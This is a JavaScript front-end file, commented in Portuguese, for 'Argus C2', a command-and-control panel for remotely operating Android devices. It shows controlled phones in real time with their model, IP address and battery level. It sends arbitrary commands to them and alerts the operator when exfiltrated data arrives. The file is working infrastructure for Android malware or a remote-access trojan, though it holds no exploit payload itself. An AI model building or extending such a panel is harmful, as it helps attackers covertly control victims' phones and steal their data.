/**
 * Argus C2 - Frontend JavaScript Application
 * Sistema de controle remoto Android com WebSocket em tempo real
 */

// ==================== CONFIGURAÇÃO GLOBAL ====================

const CONFIG = {
    socketURL: window.location.protocol + '//' + window.location.host,
    autoRefreshInterval: 30000, // 30 segundos
    notificationDuration: 5000,  // 5 segundos
    maxLogEntries: 100
};

// Estado global da aplicação
const AppState = {
    socket: null,
    devices: {},
    selectedDevice: null,
    isConnected: false,
    stats: {
        totalDevices: 0,
        onlineDevices: 0,
        totalCommands: 0,
        pendingCommands: 0
    }
};

// ==================== INICIALIZAÇÃO ====================

document.addEventListener('DOMContentLoaded', () => {
    console.log('Argus C2 Frontend iniciando...');
    
    // Inicializar WebSocket
    initializeWebSocket();
    
    // Carregar dados iniciais
    loadInitialData();
    
    // Configurar event listeners
    setupEventListeners();
    
    // Iniciar auto-refresh (fallback)
    startAutoRefresh();
    
    console.log('Frontend inicializado com sucesso');
});

// ==================== WEBSOCKET ====================

function initializeWebSocket() {
    console.log('Conectando ao WebSocket...');
    
    // Conectar ao Socket.IO
    AppState.socket = io(CONFIG.socketURL);
    
    // Evento: Conectado
    AppState.socket.on('connect', () => {
        console.log('WebSocket conectado!');
        AppState.isConnected = true;
        updateConnectionStatus(true);
        showNotification('Conectado ao servidor C2', 'success');
    });
    
    // Evento: Desconectado
    AppState.socket.on('disconnect', () => {
        console.log('WebSocket desconectado');
        AppState.isConnected = false;
        updateConnectionStatus(false);
        showNotification('Conexão perdida com servidor', 'warning');
    });
    
    // Evento: Novo dispositivo conectado
    AppState.socket.on('device_connected', (data) => {
        console.log('Novo dispositivo conectado:', data);
        const device = data.device;
        AppState.devices[device.device_id] = device;
        addDeviceToTable(device);
        updateStats();
        showNotification(`Dispositivo ${device.device_id} conectado`, 'info');
    });
    
    // Evento: Dispositivo desconectado
    AppState.socket.on('device_disconnected', (data) => {
        console.log('Dispositivo desconectado:', data);
        updateDeviceStatus(data.device_id, 'offline');
        updateStats();
        showNotification(`Dispositivo ${data.device_id} desconectado`, 'warning');
    });
    
    // Evento: Novo comando recebido
    AppState.socket.on('new_command', (data) => {
        console.log('Novo comando:', data);
        addCommandToList(data.command);
        updateStats();
    });
    
    // Evento: Comando atualizado
    AppState.socket.on('command_updated', (data) => {
        console.log('Comando atualizado:', data);
        updateCommandStatus(data.command_id, data.status, data.result);
        updateStats();
        
        if (data.status === 'completed') {
            showNotification(`Comando ${data.command_id} executado com sucesso`, 'success');
        } else if (data.status === 'failed') {
            showNotification(`Comando ${data.command_id} falhou: ${data.message}`, 'error');
        }
    });
    
    // Evento: Novos dados exfiltrados
    AppState.socket.on('new_data', (data) => {
        console.log('Novos dados exfiltrados:', data);
        addDataNotification(data.device_id, data.data_type);
        updateStats();
    });
    
    // Evento: Heartbeat de dispositivo
    AppState.socket.on('heartbeat', (data) => {
        console.log('Heartbeat de dispositivo:', data.device_id);
        updateDeviceLastSeen(data.device_id);
    });
    
    // Evento: Erro
    AppState.socket.on('error', (error) => {
        console.error('Erro no WebSocket:', error);
        showNotification('Erro de comunicação: ' + error.message, 'error');
    });
}

function updateConnectionStatus(isConnected) {
    const statusElement = document.getElementById('connection-status');
    if (statusElement) {
        if (isConnected) {
            statusElement.innerHTML = '<span class="badge bg-success">Conectado</span>';
        } else {
            statusElement.innerHTML = '<span class="badge bg-danger">Desconectado</span>';
        }
    }
}

// ==================== CARREGAMENTO DE DADOS ====================

async function loadInitialData() {
    try {
        // Carregar dispositivos
        const devicesResponse = await fetch('/api/devices');
        const devicesData = await devicesResponse.json();
        
        if (Array.isArray(devicesData.devices)) {
            devicesData.devices.forEach(device => {
                AppState.devices[device.device_id] = device;
                addDeviceToTable(device);
            });
        }
        
        // Carregar estatísticas
        updateStats();
        
        console.log('Dados iniciais carregados');
    } catch (error) {
        console.error('Erro ao carregar dados iniciais:', error);
        showNotification('Erro ao carregar dados do servidor', 'error');
    }
}

async function updateStats() {
    try {
        const response = await fetch('/api/stats');
        const data = await response.json();
        
        if (data.stats) {
            AppState.stats = data.stats;
            updateStatsDisplay();
        }
    } catch (error) {
        console.error('Erro ao atualizar estatísticas:', error);
    }
}

function updateStatsDisplay() {
    const stats = AppState.stats;
    
    // Atualizar cards de estatísticas
    updateElementText('stat-total-devices', stats.total_devices || 0);
    updateElementText('stat-online-devices', stats.online_devices || 0);
    updateElementText('stat-total-commands', stats.total_commands || 0);
    updateElementText('stat-pending-commands', stats.pending_commands || 0);
    
    // Atualizar percentuais
    const onlinePercent = stats.total_devices > 0 
        ? ((stats.online_devices / stats.total_devices) * 100).toFixed(1)
        : 0;
    updateElementText('stat-online-percent', onlinePercent + '%');
}

function updateElementText(elementId, text) {
    const element = document.getElementById(elementId);
    if (element) {
        element.textContent = text;
    }
}

// ==================== GERENCIAMENTO DE DISPOSITIVOS ====================

function addDeviceToTable(device) {
    const tbody = document.getElementById('devices-tbody');
    if (!tbody) return;
    
    // Verificar se dispositivo já existe na tabela
    let row = document.getElementById('device-row-' + device.device_id);
    
    if (row) {
        // Atualizar linha existente
        updateDeviceRow(row, device);
    } else {
        // Criar nova linha
        row = createDeviceRow(device);
        tbody.appendChild(row);
    }
}

function createDeviceRow(device) {
    const row = document.createElement('tr');
    row.id = 'device-row-' + device.device_id;
    
    const statusBadge = device.status === 'online' 
        ? '<span class="badge bg-success">Online</span>'
        : '<span class="badge bg-secondary">Offline</span>';
    
    const batteryIcon = device.is_charging 
        ? '<i class="bi bi-battery-charging"></i>'
        : '<i class="bi bi-battery"></i>';
    
    row.innerHTML = `
        <td><input type="checkbox" class="device-checkbox" value="${device.device_id}"></td>
        <td><strong>${device.device_id}</strong></td>
        <td>${device.model || 'N/A'}</td>
        <td>${device.manufacturer || 'N/A'}</td>
        <td>${device.android_version || 'N/A'}</td>
        <td>${statusBadge}</td>
        <td>${device.ip_address || 'N/A'}</td>
        <td>${batteryIcon} ${device.battery_level || 0}%</td>
        <td>${formatDateTime(device.last_seen)}</td>
        <td>
            <button class="btn btn-sm btn-primary" onclick="viewDevice('${device.device_id}')">
                <i class="bi bi-eye"></i> Ver
            </button>
            <button class="btn btn-sm btn-success" onclick="sendCommandModal('${device.device_id}')">
                <i class="bi bi-terminal"></i> Comando
            </button>
            <button class="btn btn-sm btn-danger" onclick="deleteDevice('${device.device_id}')">
                <i class="bi bi-trash"></i> Excluir
            </button>
        </td>
    `;
    
    return row;
}

function updateDeviceRow(row, device) {
    // Atualizar células específicas sem recriar toda a row
    const cells = row.cells;
    
    cells[2].textContent = device.model || 'N/A';
    cells[3].textContent = device.manufacturer || 'N/A';
    cells[4].textContent = device.android_version || 'N/A';
    
    const statusBadge = device.status === 'online' 
        ? '<span class="badge bg-success">Online</span>'
        : '<span class="badge bg-secondary">Offline</span>';
    cells[5].innerHTML = statusBadge;
    
    cells[6].textContent = device.ip_address || 'N/A';
    
    const batteryIcon = device.is_charging 
        ? '<i class="bi bi-battery-charging"></i>'
        : '<i class="bi bi-battery"></i>';
    cells[7].innerHTML = `${batteryIcon} ${device.battery_level || 0}%`;
    
    cells[8].textContent = formatDateTime(device.last_seen);
}

function updateDeviceStatus(deviceId, status) {
    const device = AppState.devices[deviceId];
    if (device) {
        device.status = status;
        
        const row = document.getElementById('device-row-' + deviceId);
        if (row) {
            const statusBadge = status === 'online' 
                ? '<span class="badge bg-success">Online</span>'
                : '<span class="badge bg-secondary">Offline</span>';
            row.cells[5].innerHTML = statusBadge;
        }
    }
}

function updateDeviceLastSeen(deviceId) {
    const device = AppState.devices[deviceId];
    if (device) {
        device.last_seen = new Date().toISOString();
        
        const row = document.getElementById('device-row-' + deviceId);
        if (row) {
            row.cells[8].textContent = formatDateTime(device.last_seen);
        }
    }
}

// ==================== GERENCIAMENTO DE COMANDOS ====================

function addCommandToList(command) {
    const tbody = document.getElementById('commands-tbody');
    if (!tbody) return;
    
    const row = document.createElement('tr');
    row.id = 'command-row-' + command.id;
    
    const statusBadge = getCommandStatusBadge(command.status);
    
    row.innerHTML = `
        <td>${command.id}</td>
        <td>${command.device_id}</td>
        <td>${command.command_type}</td>
        <td>${statusBadge}</td>
        <td>${formatDateTime(command.created_at)}</td>
        <td>${formatDateTime(command.executed_at)}</td>
        <td>
            <button class="btn btn-sm btn-info" onclick="viewCommandResult('${command.id}')">
                <i class="bi bi-eye"></i> Ver
            </button>
        </td>
    `;
    
    // Inserir no topo da lista
    tbody.insertBefore(row, tbody.firstChild);
    
    // Limitar quantidade de linhas
    while (tbody.rows.length > CONFIG.maxLogEntries) {
        tbody.deleteRow(tbody.rows.length - 1);
    }
}

function updateCommandStatus(commandId, status, result) {
    const row = document.getElementById('command-row-' + commandId);
    if (row) {
        const statusBadge = getCommandStatusBadge(status);
        row.cells[3].innerHTML = statusBadge;
        row.cells[5].textContent = formatDateTime(new Date().toISOString());
        
        // Adicionar classe de highlight temporário
        row.classList.add('table-success');
        setTimeout(() => {
            row.classList.remove('table-success');
        }, 3000);
    }
}

function getCommandStatusBadge(status) {
    const badges = {
        'pending': '<span class="badge bg-warning">Pendente</span>',
        'sent': '<span class="badge bg-info">Enviado</span>',
        'executing': '<span class="badge bg-primary">Executando</span>',
        'completed': '<span class="badge bg-success">Concluído</span>',
        'failed': '<span class="badge bg-danger">Falhou</span>'
    };
    return badges[status] || '<span class="badge bg-secondary">Desconhecido</span>';
}

// ==================== ENVIO DE COMANDOS ====================

function sendCommandModal(deviceId) {
    AppState.selectedDevice = deviceId;
    
    const modal = new bootstrap.Modal(document.getElementById('commandModal'));
    modal.show();
}

async function sendCommand() {
    const commandType = document.getElementById('commandType').value;
    const commandData = document.getElementById('commandData').value;
    
    if (!AppState.selectedDevice) {
        showNotification('Nenhum dispositivo selecionado', 'error');
        return;
    }
    
    try {
        let parsedData = {};
        if (commandData.trim()) {
            parsedData = JSON.parse(commandData);
        }
        
        const response = await fetch('/api/command', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                device_id: AppState.selectedDevice,
                command_type: commandType,
                data: parsedData
            })
        });
        
        const result = await response.json();
        
        if (response.ok) {
            showNotification('Comando enviado com sucesso!', 'success');
            
            // Fechar modal
            const modal = bootstrap.Modal.getInstance(document.getElementById('commandModal'));
            modal.hide();
            
            // Limpar formulário
            document.getElementById('commandData').value = '';
        } else {
            showNotification('Erro ao enviar comando: ' + result.error, 'error');
        }
        
    } catch (error) {
        console.error('Erro ao enviar comando:', error);
        showNotification('Erro ao enviar comando: ' + error.message, 'error');
    }
}

// ==================== NOTIFICAÇÕES ====================

function showNotification(message, type = 'info') {
    const container = document.getElementById('notification-container') || createNotificationContainer();
    
    const notification = document.createElement('div');
    notification.className = `alert alert-${getAlertClass(type)} alert-dismissible fade show`;
    notification.role = 'alert';
    notification.innerHTML = `
        ${message}
        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
    `;
    
    container.appendChild(notification);
    
    // Auto-remover após duração configurada
    setTimeout(() => {
        notification.remove();
    }, CONFIG.notificationDuration);
}

function getAlertClass(type) {
    const classes = {
        'success': 'success',
        'error': 'danger',
        'warning': 'warning',
        'info': 'info'
    };
    return classes[type] || 'info';
}

function createNotificationContainer() {
    const container = document.createElement('div');
    container.id = 'notification-container';
    container.style.position = 'fixed';
    container.style.top = '20px';
    container.style.right = '20px';
    container.style.zIndex = '9999';
    container.style.width = '350px';
    document.body.appendChild(container);
    return container;
}

function addDataNotification(deviceId, dataType) {
    const message = `Novos dados recebidos de ${deviceId}: ${dataType}`;
    showNotification(message, 'info');
}

// ==================== UTILIDADES ====================

function formatDateTime(dateString) {
    if (!dateString) return 'N/A';
    
    const date = new Date(dateString);
    const now = new Date();
    const diff = now - date;
    
    // Se foi há menos de 1 minuto
    if (diff < 60000) {
        return 'Agora mesmo';
    }
    
    // Se foi há menos de 1 hora
    if (diff < 3600000) {
        const minutes = Math.floor(diff / 60000);
        return `${minutes} min atrás`;
    }
    
    // Se foi há menos de 24 horas
    if (diff < 86400000) {
        const hours = Math.floor(diff / 3600000);
        return `${hours}h atrás`;
    }
    
    // Formato completo
    return date.toLocaleString('pt-BR');
}

function startAutoRefresh() {
    setInterval(() => {
        if (!AppState.isConnected) {
            console.log('Auto-refresh: atualizando dados (fallback)');
            updateStats();
        }
    }, CONFIG.autoRefreshInterval);
}

function setupEventListeners() {
    // Botão de enviar comando
    const sendBtn = document.getElementById('sendCommandBtn');
    if (sendBtn) {
        sendBtn.addEventListener('click', sendCommand);
    }
    
    // Refresh manual de estatísticas
    const refreshBtn = document.getElementById('refreshStatsBtn');
    if (refreshBtn) {
        refreshBtn.addEventListener('click', updateStats);
    }
}

// ==================== FUNÇÕES GLOBAIS (chamadas por onclick) ====================

function viewDevice(deviceId) {
    window.location.href = `/device/${deviceId}`;
}

async function deleteDevice(deviceId) {
    if (!confirm(`Tem certeza que deseja excluir o dispositivo ${deviceId}?`)) {
        return;
    }
    
    try {
        const response = await fetch(`/api/device/${deviceId}`, {
            method: 'DELETE'
        });
        
        if (response.ok) {
            // Remover da tabela
            const row = document.getElementById('device-row-' + deviceId);
            if (row) {
                row.remove();
            }
            
            // Remover do estado
            delete AppState.devices[deviceId];
            
            updateStats();
            showNotification(`Dispositivo ${deviceId} excluído com sucesso`, 'success');
        } else {
            showNotification('Erro ao excluir dispositivo', 'error');
        }
    } catch (error) {
        console.error('Erro ao excluir dispositivo:', error);
        showNotification('Erro ao excluir dispositivo: ' + error.message, 'error');
    }
}

function viewCommandResult(commandId) {
    window.location.href = `/command/${commandId}`;
}

// Exportar para uso global
window.AppState = AppState;
window.sendCommandModal = sendCommandModal;
window.viewDevice = viewDevice;
window.deleteDevice = deleteDevice;
window.viewCommandResult = viewCommandResult;

console.log('app.js carregado');
